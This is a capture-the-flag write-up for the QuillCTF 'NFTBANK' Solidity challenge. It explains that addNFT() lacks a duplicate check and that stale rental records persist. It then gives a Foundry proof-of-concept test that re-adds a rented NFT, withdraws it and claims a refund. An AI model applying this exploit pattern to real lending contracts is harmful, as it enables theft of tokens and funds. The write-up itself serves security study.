---
title: QuillCTF - NFTBANK
description: 2023 | Hard | Solidity Security
tags:
    - smart contract
    - nft
    - data validation
---

## Objective of CTF

> You rent an NFT. After 10 days have passed, if you should hack the contract, and finally have the NFT, the contract should not show, that you have debt.

[QuillCTF Challenges - NFTBANK](https://quillctf.super.site/challenges/nftbank)

## Vulnerability Description

- There is no check whether an NFT is already added in the addNFT() function
- The NFT related record is not deleted after withdrawing the NFT, including nftData and rentData

## Attack Steps

- Approve the NFTBank for spending token and update the NFT config data through addNFT() function
- Get back the NFT. Since previous rentData is not deleted from rentNFTs, call refund() to get the startRentFee back
- Get the NFT back again :)

## Proof of Concept

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Test.sol";
import {NFTBank} from "../src/NFTBank.sol";
import {ERC721} from "openzeppelin-contracts/contracts/token/ERC721/ERC721.sol";
import {Ownable} from "openzeppelin-contracts/contracts/access/Ownable.sol";

contract CryptoKitties is ERC721("CryptoKitties", "MEOW"), Ownable {
    function mint(address to, uint id) external onlyOwner {
        _safeMint(to, id);
    }
}

contract NFTBankHack is Test {
    NFTBank bank;
    CryptoKitties meow;
    address nftOwner = makeAddr("nftOwner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(nftOwner);
        bank = new NFTBank();
        meow = new CryptoKitties();
        for (uint i; i < 10; i++) {
            meow.mint(nftOwner, i);
            meow.approve(address(bank), i);
            bank.addNFT(address(meow), i, 2 gwei, 500 gwei);
        }
        vm.stopPrank();
    }

    function test() public {
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);
        bank.rent{value: 500 gwei}(address(meow), 1);
        vm.warp(block.timestamp + 86400 * 10);
        
        // solution
        meow.setApprovalForAll(address(bank), true);
        bank.addNFT(address(meow), 1, 0, 500 gwei);
        bank.getBackNft(address(meow), 1, payable(attacker));
        bank.refund(address(meow), 1);
        bank.getBackNft(address(meow), 1, payable(attacker));
        // end solution
        
        vm.stopPrank();
        assertEq(attacker.balance, 1 ether);
        assertEq(meow.ownerOf(1), attacker);
    }
}
```